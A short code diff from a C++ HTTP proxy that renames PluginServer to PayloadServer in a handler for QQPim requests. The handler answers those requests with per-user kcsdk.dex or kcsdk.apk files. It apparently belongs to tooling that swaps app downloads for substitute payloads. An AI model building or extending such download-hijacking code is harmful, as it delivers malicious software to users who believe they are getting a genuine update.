@@ -1,6 +1,6 @@
 
 #include "QQPim.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 
 int gQQpimFlag = 0;
 
@@ -55,7 +55,7 @@ int QQPim::replyQQPim(char * dstbuf, LPHTTPPROXYPARAM lphttp) {
 
 		string filename = Public::getUserUrl(lphttp->username, "kcsdk.dex_new.dex");//kcsdk.dex_new.dex
 
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
 		return 0;
 	}else if (gQQpimFlag == 2)
 	{
@@ -63,7 +63,7 @@ int QQPim::replyQQPim(char * dstbuf, LPHTTPPROXYPARAM lphttp) {
 
 		string filename = Public::getUserUrl(lphttp->username, "kcsdk.apk");
 
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
 		return 0;
 	}
 	return FALSE;
